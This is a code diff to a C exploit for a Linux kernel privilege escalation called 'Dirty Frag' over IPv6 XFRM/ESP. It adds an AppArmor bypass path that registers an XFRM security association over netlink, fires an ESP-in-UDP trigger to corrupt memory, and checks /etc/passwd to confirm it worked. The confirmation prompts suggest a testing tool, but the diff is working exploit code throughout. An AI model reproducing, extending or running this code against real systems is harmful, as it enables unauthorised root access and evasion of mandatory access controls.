@@ -9,6 +9,7 @@
  */
 
 #include "dirtyfrag_esp6.h"
+#include "apparmor_bypass.h"
 
 #include <fcntl.h>
 #include <pwd.h>
@@ -378,9 +379,9 @@ df_result_t dirtyfrag_esp6_exploit(bool do_shell)
 {
     log_step("Dirty Frag (IPv6 xfrm-ESP) — exploit");
 
-    uid_t uid = getuid();
+    uid_t uid = real_uid_for_target();
     if (uid == 0) {
-        log_warn("already root — nothing to escalate");
+        log_warn("already root in init namespace — nothing to escalate");
         return DF_OK;
     }
     struct passwd *pw = getpwuid(uid);
@@ -407,20 +408,47 @@ df_result_t dirtyfrag_esp6_exploit(bool do_shell)
         log_bad("confirmation declined — aborting");
         return DF_OK;
     }
+    if (!ssh_lockout_check(user)) {
+        log_bad("SSH-lockout confirmation declined — aborting");
+        return DF_OK;
+    }
 
-    pid_t child = fork();
-    if (child < 0) { log_bad("fork: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
-    if (child == 0) {
-        int rc = run_v6_in_userns(uid_off, getuid(), getgid());
-        _exit(rc);
+#ifdef __linux__
+    if (apparmor_bypass_was_armed()) {
+        log_step("AA bypass already armed — skipping inner fork+unshare (v6)");
+        int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
+        if (nl < 0) { log_bad("netlink xfrm: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
+        struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
+        if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
+            log_bad("bind netlink: %s", strerror(errno));
+            close(nl); return DF_EXPLOIT_FAIL;
+        }
+        if (!xfrm6_register_sa(nl, (const unsigned char *)MARKER)) {
+            close(nl); return DF_EXPLOIT_FAIL;
+        }
+        log_ok("v6 XFRM SA registered with seq_hi='%s'", MARKER);
+        if (!trigger_store_v6(uid_off)) { close(nl); return DF_EXPLOIT_FAIL; }
+        log_ok("v6 ESP-in-UDP trigger fired");
+        close(nl);
+    } else {
+        pid_t child = fork();
+        if (child < 0) { log_bad("fork: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
+        if (child == 0) {
+            int rc = run_v6_in_userns(uid_off, getuid(), getgid());
+            _exit(rc);
+        }
+        int wstat = 0;
+        waitpid(child, &wstat, 0);
+        if (!WIFEXITED(wstat) || WEXITSTATUS(wstat) != 0) {
+            log_bad("v6 child failed (exit %d)",
+                    WIFEXITED(wstat) ? WEXITSTATUS(wstat) : -1);
+            return DF_EXPLOIT_FAIL;
+        }
     }
-    int wstat = 0;
-    waitpid(child, &wstat, 0);
-    if (!WIFEXITED(wstat) || WEXITSTATUS(wstat) != 0) {
-        log_bad("v6 child failed (exit %d)",
-                WIFEXITED(wstat) ? WEXITSTATUS(wstat) : -1);
-        return DF_EXPLOIT_FAIL;
-    }
+#else
+    log_bad("dirtyfrag_esp6_exploit: Linux-only");
+    return DF_TEST_ERROR;
+#endif
 
     int v = open("/etc/passwd", O_RDONLY);
     if (v < 0) { log_bad("verify open: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
